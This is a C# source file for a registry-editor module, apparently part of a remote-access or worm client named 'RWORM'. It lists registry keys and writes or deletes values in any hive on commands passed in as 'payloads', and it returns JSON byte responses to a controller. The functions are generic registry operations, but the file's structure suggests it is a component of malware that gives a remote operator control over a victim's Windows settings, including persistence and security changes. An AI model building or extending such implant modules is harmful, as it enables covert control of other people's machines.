using System;
using System.Collections.Generic;
using System.Text.Json;
using Microsoft.Win32;

namespace RWORM.Client.Modules
{
    public static class RegEditor
    {
        private static RegistryKey? OpenHive(string hive) => hive.ToUpperInvariant() switch
        {
            "HKLM" or "HKEY_LOCAL_MACHINE"  => Registry.LocalMachine,
            "HKCU" or "HKEY_CURRENT_USER"   => Registry.CurrentUser,
            "HKCR" or "HKEY_CLASSES_ROOT"   => Registry.ClassesRoot,
            "HKU"  or "HKEY_USERS"          => Registry.Users,
            "HKCC" or "HKEY_CURRENT_CONFIG" => Registry.CurrentConfig,
            _ => null
        };

        // payload format: "HIVE\PATH"
        public static byte[] ListKey(string fullPath)
        {
            try
            {
                var parts   = fullPath.Split('\\', 2);
                var hive    = OpenHive(parts[0]);
                if (hive == null) return Err("Unknown hive");
                var subPath = parts.Length > 1 ? parts[1] : "";
                using var key = string.IsNullOrEmpty(subPath)
                    ? hive
                    : hive.OpenSubKey(subPath);
                if (key == null) return Err("Key not found");

                var subs   = key.GetSubKeyNames();
                var values = new List<object>();
                foreach (var vn in key.GetValueNames())
                {
                    var val = key.GetValue(vn);
                    var kind= key.GetValueKind(vn).ToString();
                    values.Add(new { name = vn, kind, value = val?.ToString() ?? "" });
                }
                return Ok(new { subkeys = subs, values });
            }
            catch (Exception ex) { return Err(ex.Message); }
        }

        public static byte[] WriteValue(string fullPath, string valueName, string kind, string data)
        {
            try
            {
                var parts  = fullPath.Split('\\', 2);
                var hive   = OpenHive(parts[0]);
                if (hive == null) return Err("Unknown hive");
                using var key = hive.CreateSubKey(parts[1], writable: true);
                if (key == null) return Err("Cannot open key for writing");

                object val = kind.ToUpperInvariant() switch
                {
                    "DWORD"  => int.Parse(data),
                    "QWORD"  => long.Parse(data),
                    "BINARY" => Convert.FromHexString(data),
                    _ => data  // REG_SZ, REG_EXPAND_SZ etc.
                };

                var regKind = kind.ToUpperInvariant() switch
                {
                    "DWORD"      => RegistryValueKind.DWord,
                    "QWORD"      => RegistryValueKind.QWord,
                    "BINARY"     => RegistryValueKind.Binary,
                    "MULTI_SZ"   => RegistryValueKind.MultiString,
                    "EXPAND_SZ"  => RegistryValueKind.ExpandString,
                    _ => RegistryValueKind.String
                };

                key.SetValue(valueName, val, regKind);
                return Ok("written");
            }
            catch (Exception ex) { return Err(ex.Message); }
        }

        public static byte[] DeleteValue(string fullPath, string valueName)
        {
            try
            {
                var parts = fullPath.Split('\\', 2);
                var hive  = OpenHive(parts[0]);
                if (hive == null) return Err("Unknown hive");
                using var key = hive.OpenSubKey(parts[1], writable: true);
                key?.DeleteValue(valueName, false);
                return Ok("deleted");
            }
            catch (Exception ex) { return Err(ex.Message); }
        }

        private static byte[] Ok(object payload)
            => System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(new { ok = true, data = payload }));
        private static byte[] Err(string msg)
            => System.Text.Encoding.UTF8.GetBytes(JsonSerializer.Serialize(new { ok = false, error = msg }));
    }
}
